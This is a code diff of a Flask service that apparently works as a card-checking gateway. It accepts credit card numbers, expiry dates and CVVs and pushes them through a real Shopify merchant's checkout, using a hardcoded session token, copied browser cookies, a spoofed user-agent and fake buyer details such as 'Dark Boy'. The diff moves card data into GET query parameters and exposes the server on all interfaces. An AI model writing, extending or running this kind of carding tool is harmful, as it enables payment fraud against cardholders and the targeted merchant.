@@ -1,12 +1,13 @@
 from flask import Flask, request, jsonify
 import requests
 import uuid
+import os
 
 app = Flask(__name__)
 
 # Configuration for Shopify API endpoints
-SHOPIFY_SESSION_URL = 'https://checkout.pci.shopifyinc.com/sessions'
-SHOPIFY_CHECKOUT_URL = 'https://www.vanguardmil.com/checkouts/unstable/graphql'
+SHOPIFY_SESSION_URL = os.getenv('SHOPIFY_SESSION_URL', 'https://checkout.pci.shopifyinc.com/sessions')
+SHOPIFY_CHECKOUT_URL = os.getenv('SHOPIFY_CHECKOUT_URL', 'https://www.vanguardmil.com/checkouts/unstable/graphql')
 
 # Headers for Shopify session request
 session_headers = {
@@ -42,7 +43,7 @@ checkout_headers = {
     'sec-fetch-site': 'same-origin',
     'shopify-checkout-client': 'checkout-web/1.0',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
-    'x-checkout-one-session-token': 'AAEBQjASMCKIMMo0cQPwMGutxb4UE5o3USInziN-TxyMi3uSCWP2Vo_1AJXLpkdrvl7sjT_xQUBawyQNzcYt3p6APfGrRXhDioEuPZhTfEq3vuHElP8ajaKdkI-RstIS1DwqbcCRYHbgUyGb39lmYOgVoOmwcOUXofzCG3xAWLA6mVNj6vPYFvLFZ5lUI17-BOqPi4-uU_EbSdnkXNNON4_3GQ',
+    'x-checkout-one-session-token': os.getenv('CHECKOUT_SESSION_TOKEN', 'AAEBQjASMCKIMMo0cQPwMGutxb4UE5o3USInziN-TxyMi3uSCWP2Vo_1AJXLpkdrvl7sjT_xQUBawyQNzcYt3p6APfGrRXhDioEuPZhTfEq3vuHElP8ajaKdkI-RstIS1DwqbcCRYHbgUyGb39lmYOgVoOmwcOUXofzCG3xAWLA6mVNj6vPYFvLFZ5lUI17-BOqPi4-uU_EbSdnkXNNON4_3GQ'),
     'x-checkout-web-build-id': '1425498c9f082684649666eafda564f07561d25c',
     'x-checkout-web-deploy-stage': 'production',
     'x-checkout-web-server-handling': 'fast',
@@ -71,22 +72,32 @@ cookies = {
     '_ga_3DVY3EV05L': 'GS2.1.s1753859150$o1$g1$t1753859245$j60$l0$h0',
 }
 
-@app.route('/gateway=sh23$/cc=', methods=['POST'])
+@app.route('/gateway=sh23$/cc=', methods=['GET'])
 def process_credit_card_payment():
     try:
-        # Extract JSON data from request
-        data = request.get_json()
-        if not data:
-            return jsonify({'error': 'No JSON data provided'}), 400
-
-        # Extract credit card details
-        credit_card = data.get('credit_card', {})
-        card_number = credit_card.get('number')
-        month = credit_card.get('month')
-        year = credit_card.get('year')
-        verification_value = credit_card.get('verification_value')
-        name = credit_card.get('name')
-        payment_session_scope = data.get('payment_session_scope', 'vanguardmil.com')
+        # Extract query parameters
+        card_number = request.args.get('card_number')
+        month = request.args.get('month', type=int)
+        year = request.args.get('year', type=int)
+        verification_value = request.args.get('verification_value')
+        name = request.args.get('name')
+        payment_session_scope = request.args.get('payment_session_scope', 'vanguardmil.com')
+        address1 = request.args.get('address1', 'New York')
+        address2 = request.args.get('address2', 'New York')
+        city = request.args.get('city', 'New York')
+        country_code = request.args.get('countryCode', 'US')
+        postal_code = request.args.get('postalCode', '10200')
+        first_name = request.args.get('firstName', 'Dark')
+        last_name = request.args.get('lastName', 'Boy')
+        zone_code = request.args.get('zoneCode', 'NY')
+        phone = request.args.get('phone', '9685698569')
+        email = request.args.get('email', 'kjbksefb@gmail.com')
+        buyer_country_code = request.args.get('buyerCountryCode', 'IN')
+        phone_country_code = request.args.get('phoneCountryCode', 'IN')
+        quantity = request.args.get('quantity', 1, type=int)
+        amount = request.args.get('amount', '3.50')
+        total_amount = request.args.get('total_amount', '23.3')
+        request_url = request.args.get('requestUrl', 'https://www.vanguardmil.com/checkouts/cn/hWN1DD0iR9Rfnqmheh7rVKMb?cart_link_id=LT5dG7f5')
 
         if not all([card_number, month, year, verification_value, name]):
             return jsonify({'error': 'Missing required credit card fields'}), 400
@@ -157,15 +168,15 @@ def process_credit_card_payment():
                         'deliveryLines': [{
                             'destination': {
                                 'streetAddress': {
-                                    'address1': data.get('address1', 'New York'),
-                                    'address2': data.get('address2', 'New York'),
-                                    'city': data.get('city', 'New York'),
-                                    'countryCode': data.get('countryCode', 'US'),
-                                    'postalCode': data.get('postalCode', '10200'),
-                                    'firstName': data.get('firstName', 'Dark'),
-                                    'lastName': data.get('lastName', 'Boy'),
-                                    'zoneCode': data.get('zoneCode', 'NY'),
-                                    'phone': data.get('phone', '9685698569'),
+                                    'address1': address1,
+                                    'address2': address2,
+                                    'city': city,
+                                    'countryCode': country_code,
+                                    'postalCode': postal_code,
+                                    'firstName': first_name,
+                                    'lastName': last_name,
+                                    'zoneCode': zone_code,
+                                    'phone': phone,
                                     'oneTimeUse': False,
                                 },
                             },
@@ -175,7 +186,7 @@ def process_credit_card_payment():
                                     'customDeliveryRate': False,
                                 },
                                 'options': {
-                                    'phone': data.get('phone', '9685698569'),
+                                    'phone': phone,
                                 },
                             },
                             'targetMerchandiseLines': {
@@ -209,12 +220,12 @@ def process_credit_card_payment():
                             },
                             'quantity': {
                                 'items': {
-                                    'value': data.get('quantity', 1),
+                                    'value': quantity,
                                 },
                             },
                             'expectedTotalPrice': {
                                 'value': {
-                                    'amount': data.get('amount', '3.50'),
+                                    'amount': amount,
                                     'currencyCode': 'USD',
                                 },
                             },
@@ -233,15 +244,15 @@ def process_credit_card_payment():
                                     'sessionId': session_result.get('session_id', 'west-bd6eca1c027ee66479ac2284d5e70eaa'),
                                     'billingAddress': {
                                         'streetAddress': {
-                                            'address1': data.get('address1', 'New York'),
-                                            'address2': data.get('address2', 'New York'),
-                                            'city': data.get('city', 'New York'),
-                                            'countryCode': data.get('countryCode', 'US'),
-                                            'postalCode': data.get('postalCode', '10200'),
-                                            'firstName': data.get('firstName', 'Dark'),
-                                            'lastName': data.get('lastName', 'Boy'),
-                                            'zoneCode': data.get('zoneCode', 'NY'),
-                                            'phone': data.get('phone', '9685698569'),
+                                            'address1': address1,
+                                            'address2': address2,
+                                            'city': city,
+                                            'countryCode': country_code,
+                                            'postalCode': postal_code,
+                                            'firstName': first_name,
+                                            'lastName': last_name,
+                                            'zoneCode': zone_code,
+                                            'phone': phone,
                                         },
                                     },
                                     'cardSource': None,
@@ -249,37 +260,37 @@ def process_credit_card_payment():
                             },
                             'amount': {
                                 'value': {
-                                    'amount': data.get('total_amount', '23.3'),
+                                    'amount': total_amount,
                                     'currencyCode': 'USD',
                                 },
                             },
                         }],
                         'billingAddress': {
                             'streetAddress': {
-                                'address1': data.get('address1', 'New York'),
-                                'address2': data.get('address2', 'New York'),
-                                'city': data.get('city', 'New York'),
-                                'countryCode': data.get('countryCode', 'US'),
-                                'postalCode': data.get('postalCode', '10200'),
-                                'firstName': data.get('firstName', 'Dark'),
-                                'lastName': data.get('lastName', 'Boy'),
-                                'zoneCode': data.get('zoneCode', 'NY'),
-                                'phone': data.get('phone', '9685698569'),
+                                'address1': address1,
+                                'address2': address2,
+                                'city': city,
+                                'countryCode': country_code,
+                                'postalCode': postal_code,
+                                'firstName': first_name,
+                                'lastName': last_name,
+                                'zoneCode': zone_code,
+                                'phone': phone,
                             },
                         },
                     },
                     'buyerIdentity': {
                         'customer': {
                             'presentmentCurrency': 'USD',
-                            'countryCode': data.get('buyerCountryCode', 'IN'),
+                            'countryCode': buyer_country_code,
                         },
-                        'email': data.get('email', 'kjbksefb@gmail.com'),
+                        'email': email,
                         'emailChanged': False,
-                        'phoneCountryCode': data.get('phoneCountryCode', 'IN'),
+                        'phoneCountryCode': phone_country_code,
                         'marketingConsent': [],
                         'shopPayOptInPhone': {
-                            'number': data.get('phone', '9685698569'),
-                            'countryCode': data.get('phoneCountryCode', 'IN'),
+                            'number': phone,
+                            'countryCode': phone_country_code,
                         },
                         'rememberMe': False,
                     },
@@ -313,7 +324,7 @@ def process_credit_card_payment():
                     'appId': 'gid://shopify/App/4748640257',
                 }],
                 'analytics': {
-                    'requestUrl': data.get('requestUrl', 'https://www.vanguardmil.com/checkouts/cn/hWN1DD0iR9Rfnqmheh7rVKMb?cart_link_id=LT5dG7f5'),
+                    'requestUrl': request_url,
                     'pageId': str(uuid.uuid4()),
                 },
             },
@@ -382,4 +393,5 @@ def process_credit_card_payment():
         return jsonify({'error': 'Internal server error', 'details': str(e)}), 500
 
 if __name__ == '__main__':
-    app.run(debug=True, port=5000)
+    port = int(os.getenv('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
